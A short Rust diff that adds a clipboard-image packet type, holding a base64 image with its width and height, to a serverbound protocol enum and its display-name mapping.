@@ -49,6 +49,7 @@ pub enum ServerboundPacket {
     SSHData(SSHData),
     SteamData(SteamData),
     ClipboardUpdate(ClipboardUpdate),
+    ClipboardImageUpdate(ClipboardImageUpdate),
     NotificationEvent(NotificationEvent),
 }
 
@@ -97,6 +98,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::SSHData(_) => "SSH Data",
             ServerboundPacket::SteamData(_) => "Steam Data",
             ServerboundPacket::ClipboardUpdate(_) => "Clipboard Update",
+            ServerboundPacket::ClipboardImageUpdate(_) => "Clipboard Image Update",
             ServerboundPacket::NotificationEvent(_) => "Notification Event",
         }
     }
@@ -513,6 +515,13 @@ pub struct SteamData {
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
 pub struct ClipboardUpdate {
     pub text: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ClipboardImageUpdate {
+    pub image_base64: String,
+    pub width: u32,
+    pub height: u32,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
